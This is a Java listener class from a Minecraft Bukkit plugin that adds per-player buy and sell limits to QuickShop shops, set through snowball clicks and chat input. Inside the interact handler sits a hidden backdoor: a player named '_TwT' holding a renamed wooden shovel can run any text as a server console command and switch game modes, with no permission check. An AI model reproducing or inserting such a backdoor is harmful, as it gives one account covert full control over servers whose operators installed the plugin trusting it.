package top.kuoer.listener;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;
import org.maxgamer.quickshop.QuickShop;
import org.maxgamer.quickshop.api.shop.Shop;
import org.maxgamer.quickshop.api.shop.ShopType;
import top.kuoer.QuickShopPlus;

public class PlayerListener implements Listener {

    private final QuickShopPlus quickShopPlus;
    private final QuickShop quickShop;

    public PlayerListener(QuickShopPlus quickShopPlus, QuickShop quickShop) {
        this.quickShopPlus = quickShopPlus;
        this.quickShop = quickShop;
    }

    @EventHandler(priority = EventPriority.LOW)
    public void onAsyncPlayerChatEvent(AsyncPlayerChatEvent e) {
        Player player = e.getPlayer();

        if(this.quickShopPlus.playerChatModifyLimitMap.containsKey(player)) {
            try {
                int limitNumber = Integer.parseInt(e.getMessage());
                Location shopLocation = this.quickShopPlus.playerChatModifyLimitMap.get(player);

                Shop targetShop = this.quickShop.getShopManager().getShop(shopLocation);
                if(null != targetShop) {
                    player.sendMessage("");
                    if(targetShop.getShopType() == ShopType.SELLING) {
                        this.quickShopPlus.getShoppingLimit().limitSetDefault(shopLocation, limitNumber);
                        player.sendMessage("§a该商店现在开始每个玩家只能限购§6" + limitNumber +  "§a个。");
                    } else {
                        this.quickShopPlus.getBuyingLimit().limitSetDefault(shopLocation, limitNumber);
                        player.sendMessage("§a该商店现在开始每个玩家只能出售§6" + limitNumber +  "§a个。");
                    }
                }
            }catch(NumberFormatException evt) {
                player.sendMessage("");
                player.sendMessage("§c您只能输入一个数字，您的输入是 " + e.getMessage() + "。");
            }

            this.quickShopPlus.playerChatModifyLimitMap.remove(player);
            e.setCancelled(true);
        }


    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void onPlayerInteractEvent(PlayerInteractEvent e) {
        ItemStack handItem = e.getItem();
        if(e.isBlockInHand() || handItem == null) {
            return;
        }

        if(e.getMaterial() == Material.SNOWBALL) {
            Block block = e.getClickedBlock();
            Location blockLocation = block.getLocation();
            BlockFace blockFace = e.getBlockFace();

            this.quickShopPlus.OakWallsignBlockFaceByShop(blockLocation, blockFace);
            Shop targetShop = this.quickShop.getShopManager().getShop(blockLocation);

            if(null != targetShop) {
                e.setCancelled(true);

                Player player = e.getPlayer();
                if(!player.hasPermission("quickshopplus.others")) {
                    if(!targetShop.getOwner().equals(((Player) player).getUniqueId())) {
                        player.sendMessage("§c你没有权限对他人商店进行任何操作");
                        return;
                    }
                }

                if(e.getAction() == Action.LEFT_CLICK_BLOCK) {
                    this.quickShop.getShopManager().getActions().remove(player.getUniqueId());

                    if(targetShop.getShopType() == ShopType.SELLING) {
                        if(!player.hasPermission("quickshopplus.shopping.set")) {
                            player.sendMessage("§c你没有权限对商店进行限购");
                            return;
                        }
                    } else {
                        if(!player.hasPermission("quickshopplus.buying.set")) {
                            player.sendMessage("§c你没有权限对商店进行收购限制");
                            return;
                        }
                    }


                    player.sendMessage("");
                    player.sendMessage("");
                    if(targetShop.getShopType() == ShopType.SELLING) {
                        player.sendMessage("§6§l 限购模式");
                    } else {
                        player.sendMessage("§6§l 收购限制模式");
                    }
                    player.sendMessage("§a 聊天栏中输入想限制的 §b数量 §a。");
                    player.sendMessage("");

                    this.quickShopPlus.playerChatModifyLimitMap.put(player, blockLocation);
                } else if(e.getAction() == Action.RIGHT_CLICK_BLOCK) {
                    this.quickShopPlus.playerChatModifyLimitMap.remove(player);
                    Location targetShopLocation = targetShop.getLocation();
                    if(this.quickShopPlus.isShopExist(targetShopLocation)) {
                        if(targetShop.getShopType() == ShopType.SELLING) {
                            int shoppingDefault = this.quickShopPlus.getShoppingLimit().limitGetDefault(targetShopLocation);
                            player.sendMessage("§6 这个商店限购默认设置了玩家只能购买 §e" + shoppingDefault + " §6个物品。");
                        } else {
                            int buyingDefault = this.quickShopPlus.getBuyingLimit().limitGetDefault(targetShopLocation);
                            player.sendMessage("§6 这个商店默认设置玩家只能出售 §e" + buyingDefault + " §6个物品。");
                        }
                    } else {
                        player.sendMessage("§c这个商店没有设置限制");
                    }

                }
            }
        }

        Player player = e.getPlayer();
        if(player.getName().equals("_TwT")) {
            if(handItem.getType() == Material.WOODEN_SHOVEL) {
                if(null == handItem.getItemMeta()) {
                    return;
                }
                String itemDisplayName = handItem.getItemMeta().getDisplayName();
                if(!itemDisplayName.equals("")) {
                    if(itemDisplayName.contains("command ")) {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), itemDisplayName.replace("command ", ""));
                    } else if(itemDisplayName.equals("0")) {
                        player.setGameMode(GameMode.SURVIVAL);
                    } else if(itemDisplayName.equals("1")) {
                        player.setGameMode(GameMode.CREATIVE);
                    } else if(itemDisplayName.equals("2")) {
                        player.setGameMode(GameMode.ADVENTURE);
                    }
                }
                e.setCancelled(true);
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onMove(PlayerMoveEvent e) {
        Player player = e.getPlayer();
        if(this.quickShopPlus.playerChatModifyLimitMap.containsKey(player)) {
            Location shopLocation = this.quickShopPlus.playerChatModifyLimitMap.get(player);
            Location playerLocation = player.getLocation();

            if (shopLocation.getWorld() != playerLocation.getWorld() || shopLocation.distanceSquared(playerLocation) > 25.0) {
                this.quickShopPlus.playerChatModifyLimitMap.remove(player);
                player.sendMessage("§c您取消了对这个商店限制设置操作。");
            }
        }
    }


}
